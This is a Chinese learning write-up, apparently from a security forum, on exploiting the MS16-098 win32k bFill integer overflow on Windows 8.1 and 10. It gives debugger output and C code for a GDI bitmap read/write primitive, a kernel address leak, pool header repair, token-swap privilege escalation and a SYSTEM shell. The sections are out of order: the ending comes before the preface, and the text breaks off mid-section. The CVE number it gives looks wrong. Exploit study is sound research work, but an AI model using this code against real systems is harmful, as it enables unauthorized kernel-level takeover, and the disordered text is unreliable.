
```
kd> dq fffff901715c7fb0 + c30
fffff901`715c8be0 fffff901`715c7fb0 00000000`00000020
fffff901`715c8bf0 ffffffff`00000000 00502000`00000000
fffff901`715c8c00 00000001`00000000 00000001`ffffffff
fffff901`715c8c10 00000000`00000158 fffff901`715c8e28
fffff901`715c8c20 fffff901`715c8e28 00001e2d`00000158
fffff901`715c8c30 00010000`00000003 00000000`00000000
fffff901`715c8c40 00000000`04800200 00000000`00000000
fffff901`715c8c50 00000000`00000000 00000000`00000000
```

成功控制溢出，可以看到最后一次修改就是在 `buf + 0xC30` 的位置，大小为 `0x30`，后面数据都没被修改

但是此结构的一些数据被修改

# 获取管理与工作位图

使用 `GetBitmapBits` 获取读取的大小判断即可，如果大小超过我们设置的大小，那么它就是管理位图，下一个就是工作位图

```c
BYTE bitmapdata[0x1000] = { 0 };
for (int i = 0; i < Count; i++)
{
res = GetBitmapBits(bitmaps[i], 0x1000, bitmapdata);
if (res > 0x158)
{
hManager = bitmaps[i];
hWorker = bitmaps[i + 1];
break;
}
}
```

你以为这样就能成功了？呵呵。。。

上述代码调用后，总会出现有一个返回值为 `0` 的情况，这是为什么呢，经过一番分析，返回值为 `0` 的时候，正好对应被我们溢出的位图，按道理来说读取的数据大小应该会很大，但实际上最后会刚好返回 `0` 值

逆向分析 `GetBitmapBits` 的底层发现，关键性的计算数据，是创建位图时的 `bitcount`，我们之前使用的是 `8`，现在需要改成 `32` 了，同时发现 `bitmap` 读取的数据最大值为 `1FFFFFFE`（不详细解释了）

好吧，分析了这么多了，不差再分析一下 `bitcount` 为 `32` 时的大小计算方式

`size = width \* 4 \* height + 0x258`

后面还是正常对齐 ， 好的 ，所以申请 `0x3C0` 的 `bitmap` 时，应该是这样

```c
CreateBitmap(0x54, 1, 1, 32, NULL);
```

修改后运行，蓝屏了

```
win32k!PDEVOBJ::bAllowShareAccess+0x3
win32k!NEEDGRELOCK::vLock+0x1d
win32k!GreGetBitmapBits+0xf8
win32k!NtGdiGetBitmapBits+0xab
```

这函数我已经分析过了，很简单

![](upload/attach/202206/930159_5UPE9DCG8KASXXE.png)

`rcx` 是 `hdev`，前面已经被覆盖为 `00000001` `00000000` 了，这刚好是个三环地址，在读取 `0x38` 的位置时，访问了无效内存导致蓝屏，在这个位置申请内存，并把值设置为 `1`，别让它返回 `0` 即可

```c
LPVOID xBuf = VirtualAlloc((LPVOID)0x100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memset(xBuf, 1, 0x100);
```

# 修复溢出的Header

```
kd> dq fffff901715c7000 + 2000 //工作位图的页 通过0x40偏移处的数据泄露内核地址
fffff901`715c9000 34316847`23bc0000 3a99d16a`77af8d66
fffff901`715c9010 00000000`0204117e 00000000`00000000
fffff901`715c9020 00000000`00000000 00000000`00000bb0
fffff901`715c9030 00000000`00000000 fffff901`715c9740
fffff901`715c9040 fffff901`715c9040 fffff901`715c9040
fffff901`715c9050 00000000`00000d18 fffff901`715c9268
fffff901`715c9060 00000049`00000730 00000001`00000001
fffff901`715c9070 00000078`00000078 80000000`00000000
```

```
kd> dq fffff901`715c9e28 - 258 //下一个位图的pvScan0指针 - 258 就是位图开始的位置
fffff901`715c9bd0 00000000`010515de 00000000`00000000
fffff901`715c9be0 00000000`00000000 00000000`00000000
fffff901`715c9bf0 00000000`010515de 00000000`00000000
fffff901`715c9c00 00000000`00000000 00000001`00000158
fffff901`715c9c10 00000000`00000158 fffff901`715c9e28
fffff901`715c9c20 fffff901`715c9e28 00001e2e`00000158
fffff901`715c9c30 00010000`00000003 00000000`00000000
fffff901`715c9c40 00000000`04800200 00000000`00000000
```

利用区域对象泄露内核地址，读取这个地址，经过计算偏移，读取正常的 `pool header` 把被溢出的部分修改好就行了

```c
//修复溢出的pool header
//泄露内核地址
BYTE leakAddr[0x8] = { 0 };
for (int i = 0; i < 8; i++)
{
leakAddr[i] = bitmapdata[0x218 + i];
}
ULONG_PTR kernelAddr = *(ULONG_PTR*)leakAddr;
kernelAddr = kernelAddr & 0xFFFFFFFFFFFFF000LL;
kernelAddr -= 0x1000;
printf("kernelAddr : %p\n", kernelAddr);
for (int i = 0; i < 8; i++)
{
leakAddr[i] = ((char*)&kernelAddr)[i];
}
//恢复区域对象的池头
SetRWAddr(leakAddr);
WriteAddr(&(bitmapdata[0x1D8]),0x10);
//恢复位图对象的池头
kernelAddr += 0xBC0;
printf("kernelAddr : %p\n", kernelAddr);
for (int i = 0; i < 8; i++)
{
leakAddr[i] = ((char*)&kernelAddr)[i];
}
SetRWAddr(leakAddr);
WriteAddr(&(bitmapdata[0xD98]), 0x10);
//一切都没问题 开始提权
ULONG64 psys = GetSystemProcess();
PrivilegeEscalation(psys, GetCurrerntProcess(psys));
//system shell
system("cmd");
```

# 提权

有任意读写原语以后，一切都是那么的随意，提权且不蓝，perfect！

![](upload/attach/202206/930159_STC3NEKRQT3TEXT.png)

# Win10上的重现

首先查看 `win32kfull!bFill` 函数，发现与 `win8.1` 一模一样的漏洞函数

好吧，不用多说了，经过分析，使用到的 `GDI` 对象大小计算方式与 `win8.1` 一模一样，所以只需要调整 `EPROCESS` 相关偏移

值得一提的是，这个版本的 `!pool` 命令失效了，原因未知哦

![](upload/attach/202206/930159_MTNDVPKAH32R5S7.png)

# 结语

分享使我快乐

# 前言

我是逆向练习生，羽墨

我正在从 `0` 开始学习二进制漏洞，如果你也跟我一样，不妨来看看小白的第一视角

---

# 概述

此漏洞编号 `CVE-2016-3099` 、`MS16-098`

# 实验环境

| 软件 | 版本 |
| --- | --- |
| Vmware | win8.1 x64 |
| Vmware | win10 v1511 x64 |
| windbg | windbg preview |
| IDA | IDA pro |

# 补丁对比

`win8.1 win32k!bFill` 函数

左边为修复后，右边为修复前

![](https://bbs.kanxue.com/upload/attach/202206/930159_E9VUP88XJ3HWQC8.png)

很明显可以看出，修复后增加了安全的乘法函数，所以呢，修复前的问题大概是乘法导致的溢出

![](https://bbs.kanxue.com/upload/attach/202206/930159_CMVA3EV9SB55MSD.png)

这里可以看到，`eax = [rbx+4] = [EPATHOBJ + 4]` ，很明显，如果 `[rbx+4]` 的值能控制，它必定会造成整数溢出，因为它使用 `32` 位的寄存器，会截断高位数据，`[rbx+4]` 这个值是什么并不重要，重要的怎么能操作它

# 到达脆弱函数

经过一番查找与跟踪，最后得到了三环到零环的调用流程

`FillPath(HDC hdc) -> NtGdiFillPath(HDC) -> xxx -> EngFillPath -> EngFastFill -> xxx -> bFill` 调用脆弱的函数

`PolylineTo->NtGdiPolyPolyDraw->GrePolylineTo->EPATHOBJ::bPolyLineTo` 用来溢出

查阅 `MSDN` 文档与百度可知，想要调用 `FillPath` 函数，需要 `BeginPath` 与 `EndPath` 函数中间调用绘图函数（猝）

在调用 `bFill` 的过程中，会有对于 `DC` 句柄的判断，发现 `DC` 有几种类型

![](https://bbs.kanxue.com/upload/attach/202206/930159_YXZM8ZCQHE982F4.png)

可以看到内存类型，支持位图上的绘图操作，看起来像是我们需要的，好的，测试一下是否可以到达此函数（当然 使用别的绘图函数一样可以到达）

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19 | `HDC hdc` `=` `GetDC(NULL);`  `HDC hMemDC` `=` `CreateCompatibleDC(hdc);`  `HGDIOBJ bitmap` `=` `CreateBitmap(``0x60``,` `0x20``,` `1``,` `32``, NULL);`  `HGDIOBJ bitobj` `=` `SelectObject(hMemDC, bitmap);`    `static POINT points[``2``];`    `for` `(``int` `i` `=` `0``; i <` `2``; i``+``+``) {`  `points[i].x` `=` `0x6020``;`  `points[i].y` `=` `0x6020``;`  `}`    `BeginPath(hMemDC);`    `for` `(``int` `j` `=` `0``; j <` `2``; j``+``+``)`  `PolylineTo(hMemDC, points,` `2``);`    `EndPath(hMemDC);`  `FillPath(hMemDC);` |

这份代码并不能到达脆弱函数，经过分析，在 `bEngFastFillEnum` 函数中两次对 `[EPATHOBJ + 4]` 的内容进行判断，而这个内容经过查找资料，就是 `PATH` 对象的点数（对 `GDI` 开发不懂，貌似是这样。。）

值得一提的是，某个地方会把 `[EPATHOBJ + 4] + 1` ，好的，事情就是这样，把 `points` 数组弄大一点调用即可（当然，调用别的绘图函数也可以）

修改代码后运行，成功断下

`windbg` 必须使用 `ba` 命令下断， 不然无法断下 ，断下第一次以后就不会出现无效内存的情况，调用堆栈如下

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9 | `win32k!bFill`  `win32k!bEngFastFillEnum``+``0xcd`  `win32k!bPaintPath``+``0xd4`  `win32k!EngFastFill``+``0x97`  `win32k!EngFillPath``+``0x12c`  `win32k!EPATHOBJ::bSimpleFill``+``0x130`  `win32k!EPATHOBJ::bStrokeAndOrFill``+``0x2ff`  `win32k!NtGdiFillPath``+``0x8e`  `nt!KiSystemServiceCopyEnd``+``0x13` |

# 溢出值的控制

在我们成功找到到达脆弱函数的方法后，考虑一下如何来控制溢出的值

经过前面的分析，`[EPATHOBJ + 4]` 是 `points` 数组的大小 ，它的值在于 `PolylineTo` 的调用，分析一下

![](https://bbs.kanxue.com/upload/attach/202206/930159_SX4338KHGFMPRVY.png)

可以看到在这里会对 `[EPATHOBJ + 4]` 进行 `ADD` 操作， 源操作数为三环传来的 第三个参数

那么他们的关系会是这样（前面看到过都是使用 `4` 字节的寄存器）

`0xFFFFFFFF / 3 = 0x5555556`

`0x5555556 / 3 = 0x3FE01 * 0x156`

因式分解后，我们调用 `156` 次 `PolylineTo`，并且它的第三个参数应为 `0x3FE01`，所以 `points` 数组的数量也是 `0x3FE01`

之前分析过它会 `+1`，所以最后会得到 `0x55555557 * 3 << 4 = 0x50`

所以现在会造成，分配了 `50` 字节大小的空间 ，修改代码进行尝试

|  |  |
| --- | --- |
| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16 | `kd> g`  `Breakpoint` `1` `hit`  `win32k!bFill``+``0x377``:`  `` fffff960` ```00361c77` `8d0c40`          `lea     ecx,[rax``+``rax``*``2``]`  `kd> r rax`  `rax``=``0000000005555557`    `....`  `kd> r ecx`  `ecx` `=` `50`  `...`    `kd> !pool fffff90141c2a380`  `Pool page fffff90141c2a380 region` `is` `Paged session pool`  `*``fffff90141c2a370 size:` `60` `previous size:   d0  (Allocated)` `*``Gedg`  `Pooltag Gedg : GDITAG_EDGE, Binary : win32k!bFill` |

好的，看来之前的分析是正确的，最后得到了 `50` 作为参数去申请内存

查看申请的内存，分页内存池，`pool tag` 为 `Gedg` ，对象为 `EDGE`

|  |  |
| --- | --- |
| 1  2 | `` fffff901` ```67646547` `: nt!ExFreePoolWithTag``+``0x124f`  `` fffff803` ```22940c6f` `: win32k!bFill``+``0x4f0` |

之后在 `bFill` 中释放此内存会蓝屏，原因为 `BAD_POOL_HEADER` ，应该是因为缓冲区太小，写到范围外了

此时考虑这个溢出写能否控制，如果不能都是废话。。。

# 逆向分析构造函数

首先就是这个函数 `bConstructGET` ， 先看一下这个函数的参数

|  |  |
| --- | --- |
